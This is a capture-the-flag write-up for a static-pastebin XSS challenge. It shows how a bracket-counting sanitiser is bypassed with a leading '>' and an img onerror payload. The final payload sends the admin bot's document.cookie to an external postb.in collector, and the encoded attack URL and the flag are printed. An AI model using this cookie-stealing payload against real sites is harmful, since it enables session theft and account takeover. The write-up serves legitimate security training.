# static-pastebin
This is a typical XSS challenge where we want the bot to visit our pastebin and execute `js` to get the cookie.
## Filters and Network
I tried to input some strings in the pastebin and monitored the network activity. There is no `POST` request and when I check the `url` it had a base 64 string as an argument. This means that all the websites does is encode the string we input then decode it when we need to display it.
So I tried the basic form of XSS
```html
<script>alert('xss')</script>
```
And it didn't show up. So I check the network again and saw a js file that has a filter on the input
```js
function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```
Here's the `clean()` function. It basically counts the amount of `<` and `>` and determin whether to display the text. 
## Bypassing the filter
We can simply bypass the filter by setting the value of `brackets` to `-1` before we enter our script tags so that everything between the script tags get's displayed.
```html
><script>alert('xss')</script>
```
Now we see that the script tags work but the `alert()` doesn't show up due to the value of `brackets`.
## Alternate form of XSS
There are many forms of XSS, including ones that have the script within the angle brackets, for example this one:
```html
><img src=x onerror="javascript:alert('xss')">
```
And surely it worked, now we need to grab the cookie of the admin bot.
## post bin
[Post Bin](https://postb.in/) is a tool that could collect all requests to a certain url and we can grab the `document.cookie` js variable by adding it as an argument.
Heres the final payload
```html
><img src=x onerror="javascript:window.location.assign(`https://postb.in/1593716639876-9019670642446?cookie=${document.cookie}`)">


```
## Flag
I bas64 encoded the string then appended it to the `url` then fed it to the bot. And surely, on my post bin page, I got a request that contains the document cookie which is the flag
```
https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXggb25lcnJvcj0iamF2YXNjcmlwdDp3aW5kb3cubG9jYXRpb24uYXNzaWduKGBodHRwczovL3Bvc3RiLmluLzE1OTM3MTY2Mzk4NzYtOTAxOTY3MDY0MjQ0Nj9jb29raWU9JHtkb2N1bWVudC5jb29raWV9YCkiPg==
```
```
flag=flag{54n1t1z4t10n_k1nd4_h4rd}
```